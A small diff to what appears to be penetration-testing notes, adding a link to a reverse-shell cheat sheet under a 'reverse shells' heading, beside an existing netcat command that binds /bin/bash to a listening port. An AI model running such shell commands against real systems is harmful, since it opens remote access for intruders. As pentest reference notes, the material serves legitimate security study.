@@ -529,6 +529,10 @@ or
 
 # reverse shells
 
+Collection os shells:
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
 #### simple netcat reverse shell [sh]
 `> nc - lvp <port> -e /bin/bash`
 
